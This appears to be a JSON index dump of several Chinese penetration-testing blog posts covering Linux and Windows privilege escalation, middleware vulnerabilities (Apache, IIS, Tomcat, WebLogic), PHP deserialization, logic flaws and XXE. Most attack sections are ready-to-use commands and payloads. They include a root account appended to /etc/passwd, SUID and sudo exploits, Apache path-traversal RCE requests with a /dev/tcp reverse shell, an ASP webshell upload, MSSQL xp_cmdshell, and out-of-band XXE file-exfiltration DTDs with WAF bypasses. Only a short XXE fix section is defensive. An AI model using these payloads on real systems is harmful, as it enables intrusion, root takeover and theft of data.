+x bt./bt 脏牛提权 漏洞描述 编号：CVE-2016-5195 名称：脏牛 危害：低权限用户利用该漏洞技术可以在全版本上实现本地提权 影响范围：Linux kernel&gt;&#x3D;2.6.22 | Android&lt;2016-10-18 漏洞原理 该漏洞具体为，get_user_page内核函数在处理Copy-on-Write(以下使用COW表示)的过程中，可能产出竞态条件造成COW过程被破坏，导致出现写数据到进程地址空间内只读内存区域的机会。修改su或者passwd程序就可以达到root的目的。 12345uname -a 寻找exp: https://www.exploit-db.com/exploits/40847编译：g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutilwget下载执行文件 ./dcow -s &#x2F;etc&#x2F;passwd可写提权 使用perl生成带有盐值的密码 12perl -le &#x27;print crypt(&quot;aaabbcc&quot;,&quot;123456&quot;)&#x27;12BWKETBcM70Q 将信息添加到&#x2F;etc&#x2F;passwd文件中 1echo &quot;aaa:12Qm6c8LFmbDA:0:0:User_like_root:/root:/bin/bash&quot; &gt;&gt;/etc/passwd 切换用户 1su aaa 定时任务提权 手动收集信息 1234#以下命令将尝试查找具有root权限的SUID的文件，不同系统适用于不同的命令，一个一个试find / -perm -u=s -type f 2&gt;/dev/nullfind / -user root -perm -4000-print2&gt;/dev/nullfind / -user root -perm -4000-exec ls -ldb &#123;&#125; \\; 添加suid权限 12345678查看权限：whereis find添加权限：chmod u+s /usr/bin/find查看权限：发现有了suid权限取消suid权限：chmod 755 /usr/bin/find提权find / -perm -g=s -type f 2&gt;/dev/nullfind . -exec /bin/sh -p \\; -quit sudo提权 Unix操作系统在命令参数中转义反斜杠时存在基于堆的缓冲区溢出漏洞。当sudo通过-s或-i命令行选项在shell模式下运行命令时，它将在命令参数中使用反斜杠转义特殊字符。但使用-s或 -i标志运行sudoedit时，实际上并未进行转义，从而可能导致缓冲区溢出。只要存在sudoers文件（通常是&#x2F;etc&#x2F;sudoers），攻击者就可以使用本地普通用户利用sudo获得系统root权限。 列出目前用户可执行与无法执行的指令 1sudo -l 查看sudo版本 1234sudo --version以下版存在安全隐患sudo 1.8.2 -- 1.8.31p2sudo 1.9.0 -- 1.9.5.5p1 漏洞探测 123sudoedit -s /#返回以：&quot;sudoedit:&quot;开头的错误可能存在安全风险#返回以：&quot;usage:&quot;开头的错误响应，则无影响 复现 POC地址 https://haxx.in/CVE-2021-3156_nss_poc_ubuntu.tar.gz 1234tar -zxvf CVE-2021-3156_nss_poc_ubuntu.tar.gzcd CVE-2021-3156/make./sudo-hax-me-a-sandwich 1 环境变量提取 新建一段c代码：demo.c 123456#include&lt;unistd.h&gt;void main()&#123; setuid(0); setgid(0); system(&quot;ps&quot;);&#125; 编译：gcc demo.c -o abc复制到：&#x2F;home 目录下添加权限：chmod u+s abc查看哪些具有suid权限：find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null 使用cp命令提权 12345678cp /bin/sh /tmp/ps将原本就存在的sh文件复制到/tmp下命名为ps,所以在/tmp下，./ps就可以执行sh，但ps的结果还是正常查看进程export PATH=/tmp:$PATH这时候执行ps就是执行sh,因为环境变量加入了/tmp下./abcid提权成功","categories":[{"name":"方法总结","slug":"方法总结","permalink":"https://www.ixxzhi.cn/categories/%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/"}],"tags":[{"name":"提权","slug":"提权","permalink":"https://www.ixxzhi.cn/tags/%E6%8F%90%E6%9D%83/"}]},{"title":"常见中间件框架漏洞","slug":"常见中间件框架漏洞","date":"2023-08-19T16:05:40.000Z","updated":"2024-02-27T18:34:36.799Z","comments":true,"path":"2023/08/20/常见中间件框架漏洞/","link":"","permalink":"https://www.ixxzhi.cn/2023/08/20/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/","excerpt":"IIS IIS6.0解析漏洞 文件解析：上传文件，命名为：test.asp;jpg 文件夹解析：新建文件夹test.asp，文件夹下的所有文件都会被当成asp去解析","text":"IIS IIS6.0解析漏洞 文件解析：上传文件，命名为：test.asp;jpg 文件夹解析：新建文件夹test.asp，文件夹下的所有文件都会被当成asp去解析 IIS7.5解析漏洞 上传文件：test.jpg，访问路径：…&#x2F;image&#x2F;test.jpg&#x2F;1.php PUT任意文件上传 探测是否允许PUT 12OPTIONS /x HTTP1.1Host:www.xxx.com 上传txt文件 12345PUT /a.txt HTTP1.1Host: www.xxx.comContent-Length:30&lt;%execute request(&quot;123456&quot;)%&gt; #上传的文件内容 通过move或copy重命名 123COPY /a.txt HTTP1.1Host: www.xxx.comDestination:http://www.xxx.com/cmd.asp #将a.txt重命名为cmd.asp Apache Apache解析漏洞 上传文件：a.php.xxx，apache从右往左解析，解析不了，继续向前解析 CVE-2021-41773 Apache HTTP Server 2.4.49、4.4.50存在，利用该漏洞读取到路径外其他文件，系统配置文件、网站源码等 文件读取 1GET /icons/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd RCE命令执行 12345POST /cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1Host: 118.193.36.37:53238Content-Type: text/plainContent-Length: 8echo; id CVE-2021-42013 写个反弹shell 123456789101112131415POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1Host: 123.58.224.8:29045Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 78echo; echo &quot;exec /bin/sh 0&lt;/dev/tcp/x.x.x.x/8888 1&gt;&amp;0 2&gt;&amp;0&quot; &gt; /tmp/a.sh Nginx Nginx解析漏洞 nginx_parsing_vulnerability 上传abc.png图片，访问路径：&#x2F;abc.png&#x2F;.php Nginx文件名逻辑漏洞 CVE-2013-4547 上传一个”1.gif “文件 （注意”1.gif “文件后缀后面有空格） 访问uploadfiles&#x2F;1.gif[0x20][0x00].php Nginx任意代码执行漏洞（CVE-2021-23017） Tomcat Tomcat后台弱口令 tomcat:tomcat admin:admin 登录后台上传war包： 1jar -cvf abc.war abc.jsp Tomcat任意文件上传（CVE-2017-12615） Apache Tomcat 7.0.0 - 7.0.81 抓包修改请求方式为OPTIONS，查看支持的方法 修改为PUT 1234PUT /abc.jsp/ HTTP/1.1Host: 123.58.224.8:23405Cache-Control: max-age=0&lt;%! %&gt; 访问上传的文件 Apache Tomcat AJP文件包含漏洞（CVE-2020-1938） 影响版本 Tomcat 6.* Tomcat 7.* &lt; 7.0.100 Tomcat 8.* &lt; 8.5.51 Tomcat 9.* &lt; 9.0.31 EXP：https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi 1python CNVD-2020-10487-Tomcat-Ajp-lfi.py 192.168.1.22 -p 8009 -f WEB-INF/web.xml WebLogic WebLogic XMLDecoder反序列化漏洞（CVE-2017-3506） 影响版本： 10.3.6.0.0 12.1.3.0.0 12.2.1.1.0 12.2.1.2.0 WebLogic T3协议反序列化漏洞（CVE-2018-2628） 影响版本： 10.0.6.0 12.1.3.0 12.2.1.2 12.2.1.3 WebLogic未授权访问漏洞（CVE-2020-14882） WebLogic命令执行漏洞（CVE-2020-14883） WebLogic IIOP协议反序列化漏洞（CVE-2020-2551） 其他中间件 JBOSS，jenkens等 https://cloud.tencent.com/developer/article/1904115","categories":[{"name":"漏洞原理","slug":"漏洞原理","permalink":"https://www.ixxzhi.cn/categories/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"}],"tags":[{"name":"常见Web漏洞","slug":"常见Web漏洞","permalink":"https://www.ixxzhi.cn/tags/%E5%B8%B8%E8%A7%81Web%E6%BC%8F%E6%B4%9E/"}]},{"title":"Windows提权","slug":"Windows提权","date":"2023-08-19T16:05:24.000Z","updated":"2023-09-19T02:33:50.282Z","comments":true,"path":"2023/08/20/Windows提权/","link":"","permalink":"https://www.ixxzhi.cn/2023/08/20/Windows%E6%8F%90%E6%9D%83/","excerpt":"溢出提权 收集信息 1234567whoamiwhoami /priv 查看当前用户可执行的事情net usernet localgroupversysteminfotasklist /svc","text":"溢出提权 收集信息 1234567whoamiwhoami /priv 查看当前用户可执行的事情net usernet localgroupversysteminfotasklist /svc web权限提权 手动检测提权漏洞 使用工具查找可提权的漏洞 一些大码自带功能 https://github.com/chroblert/WindowsVulnScan 使用网上的项目查找可提权的漏洞 https://i.hacking8.com/tiquan 可用exp下载 https://github.com/Ascotbe/Kernelhub https://github.com/SecWiki/windows-kernal-exploits 工具提权 msf提权 msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;0.0.0.0 LPORT&#x3D;2333 -f exe &gt; bt.exe post&#x2F;windows&#x2F;gather&#x2F;enum_patches 找出系统中的补丁 post&#x2F;nulti&#x2F;recon&#x2F;local_exploit_suggester 识别系统中可能被利用的漏洞 set showdescription true 显示详细信息 CS提权 基本命令： 12后台启动 nohub ./teamserver ip 密码 &amp;修改默认端口： 50055 teamserver文件 本地提权 查找步骤和前面一样 登录本地用户 执行提权的CVE：例如CVE-2020-0780 本地执行CVE-2020-0780.exe，新弹出个高权限的命令窗口 数据库提权 一般网站都会搭建数据库，所以可以用数据库进行提权 mysql提权 前提：知道数据库密码 通过sql注入，爆破，任意文件读取等获取密码 UDF提权 mysql的聂志函数虽然丰富，但毕竟不能完全满足所有人的需要，有时候我们需要对表中的数据进行一些处理而内置函数不能满足需要的时候就需要对MySQL进行一些扩展，MySQL给使用者提供了添加新函数的机制，这种使用者自行添加的MySQL函数就称为UDF。 提权原理 通过定义自定义函数，通过添加新函数，执行系统命令。比如通过引入udf.dll，引入自动以函数(sys_eval函数)，执行系统命令。 MSF提权 高版本： MySQL需要添加：secure-file-priv&#x3D;”” MySQL版本 &gt; 5.1,udf.dll文件必须放置在MySQL安装目录的lib\\plugin文件夹下才可以创建自定义函数。 MySQL版本&lt;5.1，win 2000操作系统需要导出udf.dll到c:\\winnt\\目录下 win 2003操作系统导出udf.dll到c:\\windows\\目录下。在MySQL5.1版本及以后的环境下，udf提权时需要将udf.dll导出到mysql安装目录\\lib\\plugin目录下。 条件： 已拥有MySQL某个用户账号 知道MySQL版本、安装路径、端口是否开放(select @@basedir select version()) 开启外联语句 123grant all privileges on *.* to &#x27;root&#x27;@&#x27;%&#x27; identified by &#x27;Admin@123&#x27; with grant option;flush privileges; 提权 手动提权 创建文件夹: &#x2F;lib&#x2F;plugin 导入abc.dll创建sys_eval()函数 1create function sys_eval returns string soname &#x27;abc.dll&#x27;; 使用sys_eval()函数 1select sys_eval(&#x27;net user&#x27;); 使用MSF模块 exploit&#x2F;nulti&#x2F;mysql&#x2F;mysql_udf_payload 再使用工具连接数据库，执行 12create function sys_eval return string soname &#x27;WGqASYxX.dll&#x27;;select sys_eval(&#x27;whoami&#x27;); MOF提权 利用了C:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof目录下的nullevt&#x2F;mof文件，每分钟都会在一个特定的时间去执行一次的特性，来写入我们的cmd命令使其被带入执行。使用MOF提权的前提是当前root账户可以复制文件到%SystemRoot%\\System32\\wbem\\MOF目录下。 失败原因：关键目录写不进去，需要等待被动去执行。 msf模块 exploit&#x2F;windows&#x2F;mysql&#x2F;mysql_mof 启动项提权 ​ 基于MySQL特性的安全问题，导入自定义的可执行文件到启动目录下，重启后加载可执行文件。 ​ 需要开启数据库外联、 MSF模块： exploit&#x2F;windows&#x2F;mysql&#x2F;mysql_start_up sql_server 提权 使用：xp_cmdshell、sq_oacreate提权 xp_cmdshell提权 1234567891011121314151617xp_cmdshell默认在mssql2000中是开启的，在mssql2005之后的版本中则默认禁止。如果用户拥有管理员sa权限则可以用sp_configure重新开启它。启用：EXEC sp_configure &#x27;show advanced options&#x27;, 1RECONFIGURE;EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1;RECONFIGURE;关闭：exec sp_configure &#x27;show advanced options&#x27;, 1;reconfigure;exec sp_configure &#x27;xp_cmdshell&#x27;, 0;reconfigure;执行：EXEC master.dbo.xp_cmdshell &#x27;命令&#x27;如果xp_cmdshell被删除了，可以上传xplog70.dll进行恢复exec master.sys.sp_addextendedproc &#x27;xp_cmdshell&#x27;, &#x27;C:\\Program Files\\Microsoft SQL Server\\MSSQL\\Binn\\xplog70.dll&#x27; sp_oacreate提权 12345678910111213141516启用：EXEC sp_configure &#x27;show advanced options&#x27;, 1;RECONFIGURE WITH OVERRIDE;EXEC sp_configure &#x27;Ole Automation Procedures&#x27;, 1;RECONFIGURE WITH OVERRIDE;关闭：EXEC sp_configure &#x27;show advanced options&#x27;, 1;RECONFIGURE WITH OVERRIDE;EXEC sp_configure &#x27;Ole Automation Procedures&#x27;, 0;RECONFIGURE WITH OVERRIDE;执行：declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\\windows\\system32\\cmd.exe /c whoami &gt;c:\\\\1.txt&#x27;以上是使用sp_oacreate的提权语句，主要是用来调用OLE对象（Object Linking and Embedding的缩写，VB中的OLE对象），利用OLE对象的run方法执行系统命令。 令牌窃取 令牌(token)是系统的临时密钥，相当于账号和密码、用来决定是否允许这次请求和判断这次请求是属于哪个用户的。它允许你在不提供账号密码或其他凭证的前提下，访问网络和系统资源，这些令牌将持续存在于系统中，除非重新启动。 令牌类型 授权令牌：交互式会话登录 模拟令牌：非交互式登录 两种token只有在系统重启后才会清除，授权令牌在用户注销后，该令牌会变为模拟令牌依旧有效。 默认只能列举当前用户和比当前用户权限更低用户的令牌，但当前的shell是administrator或system时就可以看到系统中的所有令牌 msf模块 接收到一个反弹会话 利用incognito.exe工具 use incognito 查看令牌 list_tokens -u 窃取令牌： impersonate_token “NT AUTHORITY\\SYSTEM” Bypass UAC绕过 ​ 操作系统默认情况下是启用UAC，当用户运行软件就会触发UAC规则。执行的时候就需要权限，否则是不会运行的 MFS模块 use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac 其他提权方式 psexec提权 PsExec属于SysinternalSuite(一个windows的内核的套件)，其中一个工具。 psexec这个工具可以以System账号执行一个程序 适用于本地提权 123psexec -i -s cmd -i 使用交互模式运行程序 -s 使用System账号来运行 进程注入，迁移 MSF模块","categories":[{"name":"方法总结","slug":"方法总结","permalink":"https://www.ixxzhi.cn/categories/%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/"}],"tags":[{"name":"提权","slug":"提权","permalink":"https://www.ixxzhi.cn/tags/%E6%8F%90%E6%9D%83/"}]},{"title":"PHP反序列化漏洞","slug":"反序列化漏洞","date":"2023-08-19T16:05:08.000Z","updated":"2023-08-22T16:20:32.235Z","comments":true,"path":"2023/08/20/反序列化漏洞/","link":"","permalink":"https://www.ixxzhi.cn/2023/08/20/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/","excerpt":"原理 ​ 未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程。当进行反序列化的时候可能会触发一些对象中的某些魔术方法。","text":"原理 ​ 未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程。当进行反序列化的时候可能会触发一些对象中的某些魔术方法。 反序列化：将字符串或数组转化成对象 序列化：将对象转换成字符串或数组 DEMO demo1.php 1234567891011121314151617181920212223242526&lt;?php$a=&quot;abcd&quot;; //字符串$arr = array(&#x27;j&#x27; =&gt; &#x27;jack&#x27; ,&#x27;r&#x27; =&gt; &#x27;rose&#x27;); //数组class A&#123;public $test=&quot;yeah&quot;;&#125;echo &quot;序列化:&quot;;echo &quot;&lt;/br&gt;&quot;;$aa=serialize($a);print_r($aa);echo &quot;&lt;/br&gt;&quot;;$arr_a=serialize($arr);print_r($arr_a);echo &quot;&lt;/br&gt;&quot;;$class1 = new A(); //对象$class_a=serialize($class1);print_r($class_a);//echo &quot;&lt;br/&gt;&quot;;//echo &quot;反序列化:&quot;;//echo &quot;&lt;br/&gt;&quot;;//print_r(unserialize($aa));//echo &quot;&lt;/br&gt;&quot;;//print_r(unserialize($arr_a));//echo &quot;&lt;/br&gt;&quot;;//print_r(unserialize($class_a));?&gt; 反序列化常用魔术方法 1234567891011121314__construct() 当一个对象创建时被调用，__destruct() 当一个对象销毁时被调用，__toString() 当一个对象被当作一个字符串被调用。__wakeup() 使用unserialize时触发__sleep() 使用serialize时触发__destruct() 对象被销毁时触发__call() 在对象上下文中调用不可访问的方法时触发__callStatic() 在静态上下文中调用不可访问的方法时触发__get() 用于从不可访问的属性读取数据__set() 用于将数据写入不可访问的属性__isset() 在不可访问的属性上调用isset()或empty()触发__unset() 在不可访问的属性上使用unset()时触发__toString() 把类当作字符串使用时触发,返回值需要为字符串__invoke() 当脚本尝试将对象调用为函数时触发","categories":[{"name":"漏洞原理","slug":"漏洞原理","permalink":"https://www.ixxzhi.cn/categories/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"}],"tags":[{"name":"常见Web漏洞","slug":"常见Web漏洞","permalink":"https://www.ixxzhi.cn/tags/%E5%B8%B8%E8%A7%81Web%E6%BC%8F%E6%B4%9E/"},{"name":"反序列化","slug":"反序列化","permalink":"https://www.ixxzhi.cn/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"常见逻辑漏洞","slug":"常见逻辑漏洞","date":"2023-08-19T16:04:55.000Z","updated":"2023-09-04T08:05:27.526Z","comments":true,"path":"2023/08/20/常见逻辑漏洞/","link":"","permalink":"https://www.ixxzhi.cn/2023/08/20/%E5%B8%B8%E8%A7%81%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/","excerpt":"​ 逻辑漏洞是指攻击者利用业务&#x2F;功能上的设计缺陷，获取敏感信息或破坏业务的完整性。一般出现在密码修改，确权访问，密码找回，交易支付金额等功能处。 ​ 逻辑漏洞的破坏方式并非是向程序添加破坏内容，而是利用逻辑处理不严密或者代码问题或固有不足，操作上并不影响程序的允许，在逻辑上是顺利执行的。 ​ 这种漏洞一般防护手段或设备无法阻止，因为走的是合法流量也没有防御标准。","text":"​ 逻辑漏洞是指攻击者利用业务&#x2F;功能上的设计缺陷，获取敏感信息或破坏业务的完整性。一般出现在密码修改，确权访问，密码找回，交易支付金额等功能处。 ​ 逻辑漏洞的破坏方式并非是向程序添加破坏内容，而是利用逻辑处理不严密或者代码问题或固有不足，操作上并不影响程序的允许，在逻辑上是顺利执行的。 ​ 这种漏洞一般防护手段或设备无法阻止，因为走的是合法流量也没有防御标准。 越权漏洞 越权漏洞是指应用在检查授权时存在纰漏，使得攻击者在获得低权限用户账户后，利用一些方式绕过权限检查，访问或者操作其他用户或者更高权限。越权漏洞的成因主要是因为开发人员在对数据进行增、删、改、查询时对客户端请求的数据过分相信而遗漏了权限的判定。在实际的代码审计中，这种漏洞往往很难通过工具进行自动化监测，因此在实际应用中危害很大。其与未授权访问有一定差别，目前存在着两种越权操作类型，横向越权操作（水平越权）和纵向越权操作（垂直越权）。 垂直越权 用户abc能对用户admin的信息进行修改、删除、访问等操作(abc和admin用户权限不同) 水平越权 用户abc能对用户xxx的信息进行修改、删除、访问等操作(abc和xxx用户权限相同) 容易出现的地方 一般越权漏洞容易出现在权限页面(需要登录的页面)增删改查的地方。比如：改用户的id，用户名就可以获取或修改别人的信息。 未访问授权 授权字面上理解是未获得授权，对于正常的业务来说，有些功能点需要经过登录之后才能进行，那么如果我们通过一些绕过，无需登录也可以完成此类操作，那么便是未授权访问漏洞了。常⻅的未授权漏洞一般分为两种： 组件类的，如redis未授权、mongodb未授权等，也是比较常⻅的。对于此类漏洞，可以理解为不需要登录即可执行里面的功能，所以存在未授权漏洞。 WEB层面的，如某某CMS未授权文件上传、未授权创建账号等。因为可以绕过登录限制进行操作，所以存在未授权访问漏洞。 没有对权限进行限制、限制不严格、脆弱性验证 支付逻辑漏洞 一般支付流程 一般利用 修改支付价格 修改支付状态 修改优惠券、积分 修改数量，金额 修改购买数量 修改支付接口 多重替换支付 重复支付 最小额支付 值为最大支付问题 无限制使用 密码重置 验证码在前端回显，验证码太简单，验证码复用，跳过验证步骤 URL重定向 URL 跳转漏洞是指后台服务器在告知浏览器跳转时，未对客户端传入的重定向地址进行合法性校验，导致用户浏览器跳转到钓⻥⻚面的一种漏洞。 防御： 对传入的URL 做有效性的认证，保证该URL 来自于正确的地方（添加referer限制，添加token验证）","categories":[{"name":"漏洞原理","slug":"漏洞原理","permalink":"https://www.ixxzhi.cn/categories/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"}],"tags":[{"name":"常见Web漏洞","slug":"常见Web漏洞","permalink":"https://www.ixxzhi.cn/tags/%E5%B8%B8%E8%A7%81Web%E6%BC%8F%E6%B4%9E/"}]},{"title":"任意文件下载,上传,读取","slug":"任意文件下载-上传-读取","date":"2023-08-19T16:04:41.000Z","updated":"2023-08-19T16:41:16.589Z","comments":true,"path":"2023/08/20/任意文件下载-上传-读取/","link":"","permalink":"https://www.ixxzhi.cn/2023/08/20/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-%E4%B8%8A%E4%BC%A0-%E8%AF%BB%E5%8F%96/","excerpt":"","text":"先欠着","categories":[{"name":"漏洞原理","slug":"漏洞原理","permalink":"https://www.ixxzhi.cn/categories/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"}],"tags":[{"name":"常见Web漏洞","slug":"常见Web漏洞","permalink":"https://www.ixxzhi.cn/tags/%E5%B8%B8%E8%A7%81Web%E6%BC%8F%E6%B4%9E/"}]},{"title":"XXE外部实体注入漏洞","slug":"XXE外部实体注入漏洞","date":"2023-08-19T16:04:19.000Z","updated":"2023-09-04T08:04:35.644Z","comments":true,"path":"2023/08/20/XXE外部实体注入漏洞/","link":"","permalink":"https://www.ixxzhi.cn/2023/08/20/XXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","excerpt":"概念 XML xml全称“可扩展标记语言”，是一种用于存储和传输数据的语言。与HTML一样，XML使用标签和数据的树状结构。但不同的是，XML不使用预定义标记，因此可以标记为指定描述数据的名称。 XML用于标记电子文件使其具有结构性的标记语言。可以用来标记数据，定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义、文档元素。","text":"概念 XML xml全称“可扩展标记语言”，是一种用于存储和传输数据的语言。与HTML一样，XML使用标签和数据的树状结构。但不同的是，XML不使用预定义标记，因此可以标记为指定描述数据的名称。 XML用于标记电子文件使其具有结构性的标记语言。可以用来标记数据，定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义、文档元素。 XXE XML External Entity即外部实体，从安全角度理解成XML Enternal Entity attack外部实体注入攻击。由于程序在解析输入的XML数据时，解析了攻击者伪造的外部实体而产生。会造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等。 危害：文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等 支持协议 libxml2 PHP Java .NET filehttpftp filehttpftpphpcompress.zlibcompress.bzlip2dataglobphar httphttpsftpfilejarnetdocmailtogopher * filehttphttpsftp DTD(文档类型定义) 1&lt;!DOCTYPE 根元素 [元素申明]&gt; 外部引用DTD格式 1&lt;!DOCTYPE 根元素 SYSTEM &quot;外部DTD的URI&quot; 检测 白盒：代码审计 黑盒： 手动 1234Content-Type:application/xml&lt;user&gt;&lt;username&gt;admin&lt;/username&gt;&lt;password&gt;111&lt;/password&gt;&lt;/user&gt;看到Content-Type:application/x-www-form-urlencoded改成Content-Type：application/xml或者text/xml 工具：AWVS、Xray等 利用 有回显 读取文件 12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY aaa SYSTEM &quot;file:///C:/Windows/win.ini&quot; &gt;]&gt;&lt;name&gt;&amp;aaa;&lt;/name&gt; 利用base64编码读取php文件 123456&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///C:/phpStudy/PHPTutorial/WWW/pikachu/vul/xxe/11.txt&quot;&gt;]&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt; 内网探测攻击 12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1&quot;&gt;]&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt; 引入外部DTD 去访问dtd文件时，会把dtd文件当成xml去执行(对方没有禁用外部实体) eval.dtd 1&lt;!ENTITY send SYSTEM &quot;file:///C:/windows/win.ini&quot;&gt; payload 123456&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE test[&lt;!ENTITY % dtd SYSTEM &quot;http://192.168.43.117/eval.dtd&quot;&gt;%dtd;]&gt;&lt;name&gt;&amp;send;&lt;/name&gt; 无回显 kali：开启apache日志记录 &#x2F; python起一个web服务 1234systemctl start apache2 #开启apache服务tail -f /var/log/apache2/access.log #开启日志记录python -m http.server [8080] 读取文件：加载外部dtd test.dtd 1234&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=C:/windows/win.ini&quot;&gt;&lt;!ENTITY % payload &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://192.168.43.117/?abc=%file;&#x27;&gt;&quot;&gt; %payload; payload 123456&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE test[&lt;!ENTITY % dtd SYSTEM &quot;http://192.168.43.117/xxe/test.dtd&quot;&gt;%dtd;%send;]&gt; 读取文件：加载外部xml eval.xml 12&lt;!ENTITY % payload &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://192.168.43.117/?abc=%file;&#x27;&gt;&quot;&gt; %payload; payload 12345678&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE test[&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=C:/windows/win.ini&quot;&gt;&lt;!ENTITY % dtd SYSTEM &quot;http://192.168.43.117/xxe/evil.xml&quot;&gt;%dtd;%send;]&gt; 常见绕过 协议绕过(data,filter,file) 空格绕过 原理 通常XXE漏洞存在于XML文档的开头，有的WAF会检测XML文档中开头中的某些子字符串或正则表达式，但是XML格式在设置标签属性的格式时允许使用任何数量的空格，因此我们可以在&lt;?xml?&gt;或&lt;!DOCTYPE&gt;中插入数量足够多的空格去绕过WAF的检测。 原文 123456789&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert-base64.encode/resource=/flag.txt&quot;&gt;&lt;!ENTITY % remote SYSTEM &quot;http://vps-ip/test.dtd&quot;&gt;%remote;%dtd;%xxe;]&gt; 绕过 123456789&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert-base64.encode/resource=/flag.txt&quot;&gt;&lt;!ENTITY % remote SYSTEM &quot;http://vps-ip/test.dtd&quot;&gt;%remote;%dtd;%xxe;]&gt; 编码绕过(UTF-7) 原理 当服务端对一些关键词过滤时（SYSTEM ENTITY）时，可以使用UTF-7绕过 源码 12345678&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert-base64.encode/resource=/flag.txt&quot;&gt;&lt;!ENTITY % remote SYSTEM &quot;http://vps-ip/test.dtd&quot;&gt;%remote;%dtd;%xxe;]&gt; 绕过 12345678&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-7&quot;?&gt;+ADwAIQ-DOCTYPE test +AFs-+ADwAIQ-ENTITY +ACU- file SYSTEM +ACI-php://filter/read+AD0-convert-base64.encode/resource+AD0-/flag.txt+ACIAPg-+ADwAIQ-ENTITY +ACU- remote SYSTEM +ACI-http://vps-ip/test.dtd+ACIAPg-+ACU-remote+ADs-+ACU-dtd+ADs-+ACU-xxe+ADs-+AF0APg- 修复 使用开发语言提供的禁用外部实体的方法 PHP 1libxml_disable_entity_loader(true); Python 12from lxml import etree xmlData =etree.parse(xmlSource,etree.XMLParser(resolve_entities=False)) Java 12DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false); 过滤用户提交的XML数据 过滤&lt;!DOCTYPE&gt;, &lt;!ENTITY&gt;, SYSTEM，file:&#x2F;&#x2F;,http:&#x2F;&#x2F; 